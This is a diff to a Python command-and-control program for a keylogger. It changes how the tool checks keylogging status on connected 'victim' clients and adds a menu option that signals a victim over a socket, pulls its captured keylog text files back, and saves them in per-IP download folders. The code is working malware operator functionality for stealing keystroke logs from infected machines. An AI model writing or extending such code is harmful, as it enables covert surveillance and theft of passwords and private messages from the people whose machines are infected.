@@ -270,7 +270,7 @@ def is_file_openable(file_path):
         return False
 
 
-def is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: str):
+def __is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: str):
     if status:
         print(error_msg.format(client_ip, client_port))
         print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
@@ -278,9 +278,9 @@ def is_keylogging(status: bool, client_ip: str, client_port: int, error_msg: str
         print(constants.MENU_CLOSING_BANNER)
         return True
     else:
-        print(error_msg.format(client_ip, client_port))
-        print(constants.RETURN_MAIN_MENU_MSG)
-        print(constants.MENU_CLOSING_BANNER)
+        # print(error_msg.format(client_ip, client_port))
+        # print(constants.RETURN_MAIN_MENU_MSG)
+        # print(constants.MENU_CLOSING_BANNER)
         return False
 
 
@@ -364,7 +364,7 @@ def perform_menu_item_3(client_dict: dict):
         client_socket, (client_ip, client_port, status) = next(iter(client_dict.items()))
 
         # Check if target socket is currently running keylogger
-        if is_keylogging(status, client_ip, client_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
+        if __is_keylogging(status, client_ip, client_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
             return None
 
         transfer_keylog_program(client_socket, client_ip, client_port)
@@ -377,7 +377,7 @@ def perform_menu_item_3(client_dict: dict):
                                                                                     target_ip, target_port)
 
         # Check if target socket is currently running keylogger
-        if is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
+        if __is_keylogging(status, target_ip, target_port, constants.FILE_TRANSFER_KEYLOG_TRUE_ERROR):
             return None
 
         if target_socket:
@@ -403,20 +403,20 @@ def perform_menu_item_1(client_dict: dict):
         # Get client socket
         client_socket, (ip, port, status) = next(iter(client_dict.items()))
 
-        if is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
+        if __is_keylogging(status, ip, port, constants.KEYLOG_STATUS_TRUE_ERROR):
             pass
         else:
             __perform_menu_item_1_helper(client_socket, client_dict, ip, port)
 
     # c) CASE: Handle any specific connected client in client list
     elif len(client_dict) != constants.ZERO:
-        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
-        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+        target_ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
+        target_port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
         target_socket, target_ip, target_port, status = find_specific_client_socket(client_dict,
                                                                                     target_ip,
                                                                                     target_port)
         if target_socket:
-            if is_keylogging(status, target_ip, target_port, constants.KEYLOG_STATUS_TRUE_ERROR):
+            if __is_keylogging(status, target_ip, target_port, constants.KEYLOG_STATUS_TRUE_ERROR):
                 pass
             else:
                 __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port)
@@ -489,20 +489,20 @@ def perform_menu_item_2(client_dict: dict):
     # b) CASE: Handle single client in client list
     if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
         # Get client socket
-        client_socket, (ip, port, is_keylogging) = next(iter(client_dict.items()))
-        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, is_keylogging)
+        client_socket, (ip, port, status) = next(iter(client_dict.items()))
+        __perform_menu_item_2_helper(client_dict, client_socket, ip, port, status)
 
     # c) CASE: Handle for clients greater than 1
     elif len(client_dict) != constants.ZERO:
-        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
-        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
-        target_socket, target_ip, target_port, is_keylogging = find_specific_client_socket(client_dict,
-                                                                                           target_ip,
-                                                                                           target_port)
+        target_ip = input(constants.ENTER_TARGET_IP_STOP_KEYLOG)
+        target_port = int(input(constants.ENTER_TARGET_PORT_STOP_KEYLOG))
+        target_socket, target_ip, target_port, status = find_specific_client_socket(client_dict,
+                                                                                    target_ip,
+                                                                                    target_port)
 
         if target_socket:
             __perform_menu_item_2_helper(client_dict, target_socket,
-                                         target_ip, target_port, is_keylogging)
+                                         target_ip, target_port, status)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
             print(constants.RETURN_MAIN_MENU_MSG)
@@ -512,7 +512,7 @@ def perform_menu_item_2(client_dict: dict):
 def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket,
                                  target_ip: str, target_port: int, status: bool):
     # Check keylog status
-    if not is_keylogging(status, target_ip, target_port, constants.STOP_KEYLOG_STATUS_FALSE):
+    if not __is_keylogging(status, target_ip, target_port, constants.STOP_KEYLOG_STATUS_FALSE):
         pass
     else:
         # Get signal from user to stop keylog on client/victim side
@@ -546,3 +546,89 @@ def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket
             print(constants.STOP_KEYLOG_RESULT_ERROR.format(result_msg))
             print(constants.RETURN_MAIN_MENU_MSG)
             print(constants.MENU_CLOSING_BANNER)
+
+
+def __make_main_and_sub_directories(client_ip: str):
+    main_directory = constants.DOWNLOADS_DIR
+    sub_directory = str(client_ip)
+
+    # Create the main directory (if it doesn't exist)
+    if not os.path.exists(main_directory):
+        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(main_directory))
+        os.mkdir(main_directory)
+        print(constants.DIRECTORY_SUCCESS_MSG)
+
+    # Get subdirectory path (downloads/[IP_addr])
+    sub_directory_path = os.path.join(main_directory, sub_directory)
+
+    # Create subdirectory (if it doesn't exist)
+    if not os.path.exists(sub_directory_path):
+        print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(sub_directory_path))
+        os.mkdir(sub_directory_path)
+        print(constants.DIRECTORY_SUCCESS_MSG)
+
+    return sub_directory_path
+
+
+def perform_menu_item_4(client_dict: dict):
+    # CASE 1: Check if client list is empty
+    if len(client_dict) == constants.ZERO:
+        print(constants.GET_KEYLOG_FILE_NO_CLIENTS_ERROR)
+
+    # CASE 2: Handle single client in client list
+    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
+        client_socket, (client_ip, client_port, status) = next(iter(client_dict.items()))
+
+        # Check if currently keylogging
+        if __is_keylogging(status, client_ip, client_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+            pass
+        else:
+            __perform_menu_item_4_helper(client_socket, client_ip, client_port)
+
+    # CASE 3: Handle a specific client/victim (or if multiple clients)
+    elif len(client_dict) != constants.ZERO:
+        target_ip = input(constants.ENTER_TARGET_IP_GET_FILES)
+        target_port = int(input(constants.ENTER_TARGET_PORT_GET_FILES))
+        target_socket, target_ip, target_port, status = find_specific_client_socket(client_dict,
+                                                                                    target_ip,
+                                                                                    target_port)
+
+        if __is_keylogging(status, target_ip, target_port, constants.GET_KEYLOG_FILE_KEYLOG_TRUE_ERROR):
+            pass
+        else:
+            __perform_menu_item_4_helper(target_socket, target_ip, target_port)
+
+
+def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str, client_port: int):
+    # Send to victim a notification that it is wanting to receive keylog files
+    print(constants.SEND_GET_KEYLOG_SIGNAL_PROMPT)
+    client_socket.send(constants.TRANSFER_KEYLOG_FILE_SIGNAL.encode())
+
+    # Await response if there are any .txt files to transfer
+    print(constants.GET_KEYLOG_PROCESS_MSG.format(client_ip, client_port))
+    response = client_socket.recv(constants.BYTE_LIMIT).decode().split('/')
+    response_status = response[0]
+    response_msg = response[1]
+    print(constants.CLIENT_RESPONSE.format(response_msg))
+
+    # If present, then create directory (eg: downloads/127.0.0.1) and start file transfer
+    if response_status == constants.STATUS_TRUE:
+        sub_directory_path = __make_main_and_sub_directories(client_ip)
+
+        # Send ACK response
+        client_socket.send("OK".encode())
+
+        # Get number of files from client/victim for iteration length
+        number_of_files = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+
+        # Send ACK
+        client_socket.send("OK".encode())
+
+        # ADD files from client to commander
+        receive_keylog_files(client_socket, int(number_of_files), sub_directory_path)
+
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+    else:
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
